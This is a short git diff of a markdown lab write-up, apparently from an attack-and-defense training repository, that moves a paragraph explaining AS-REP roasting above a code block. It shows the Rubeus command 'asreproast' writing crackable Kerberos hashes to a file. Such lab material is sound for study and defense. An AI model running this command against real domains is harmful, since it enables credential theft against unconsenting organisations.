@@ -35,12 +35,12 @@ Next we need to open up a command prompt and CD to our downloads folder where th
 cd C:\Users\bob\Downloads
 ```
 
+To obtain crackable hashes, we can use Rubeus again. However, this time, we will use the asreproast action. If we don't specify a name, Rubeus will extract hashes for each user that has Kerberos preauthentication not required
+
 ```
 .\Rubeus.exe asreproast /outfile:asrep.txt
 ```
 ![image](https://github.com/Matt4llan/Attack-Defense/assets/156334555/97415255-a4d8-4b43-b6ed-4fd0857a0fae)
-
-To obtain crackable hashes, we can use Rubeus again. However, this time, we will use the asreproast action. If we don't specify a name, Rubeus will extract hashes for each user that has Kerberos preauthentication not required
 
 ![image](https://github.com/Matt4llan/Attack-Defense/assets/156334555/f99d943e-91bd-447b-8f93-347f72ebe310)
 
